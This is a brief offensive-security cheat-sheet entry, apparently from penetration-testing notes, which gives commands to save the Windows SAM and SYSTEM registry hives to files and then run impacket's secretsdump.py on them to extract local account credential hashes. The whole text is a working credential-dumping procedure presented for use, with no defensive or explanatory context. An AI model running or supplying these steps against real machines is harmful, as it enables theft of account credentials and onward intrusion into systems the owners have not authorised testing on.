```
reg save HKLM\sam <file>
reg save HKLM\system <file>
```

dump Security Account Manager database to files.

```
git clone https://github.com/fortra/impacket
python ./impacket/examples/secretsdump.py -sam <file> -system <file> LOCAL
```

run impacket scripts to get credentials.